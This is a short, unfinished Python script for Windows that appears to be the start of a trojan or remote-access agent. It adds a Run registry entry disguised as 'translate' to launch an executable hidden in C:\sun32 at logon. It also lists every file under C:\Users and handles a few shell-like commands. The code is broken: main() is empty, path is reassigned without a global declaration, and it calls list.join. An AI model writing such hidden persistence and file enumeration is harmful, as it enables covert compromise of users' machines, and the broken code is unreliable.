#!/usr/bin/python
# -*- coding: UTF-8 -*-
import win32api
import win32con
import os

path = r"C:\Users"

class AutoRun():
	def __init__(self):
		name = 'translate'  # 要添加的项值名称
		path = r'C:\sun32\center\windows\c.exe'  # 要添加的exe路径
		# 注册表项名
		KeyName = 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'
		# 异常处理

		key = win32api.RegOpenKey(win32con.HKEY_CURRENT_USER,  KeyName, 0,  win32con.KEY_ALL_ACCESS)
		win32api.RegSetValueEx(key, name, 0, win32con.REG_SZ, path)
		win32api.RegCloseKey(key)


def list_all_path():
	all_list = []
	for root , dirs, files in os.walk(path):
		for x in files:
			z = root + "\\" + x
			all_list.append(z)

	all_list = str(all_list)
	return all_list


def linux_to_os(cmd):

	re = "none"
	cmd = cmd.split(' ')

	if cmd[0] == "ls":
		re = str(os.listdir(path))

	elif cmd[0] == "lsa":
		re = list_all_path()

	elif cmd[0] == "cdi":
		path = path + "\\" + cmd[1]

	elif cmd[0] == "cdq":

		list_p = path.split("\\")
		wz = len(list_p) - 1
		del list_p[wz]

		path = list_p.join("\\")

	return re


def main():



if __name__=='__main__':

    auto=AutoRun()

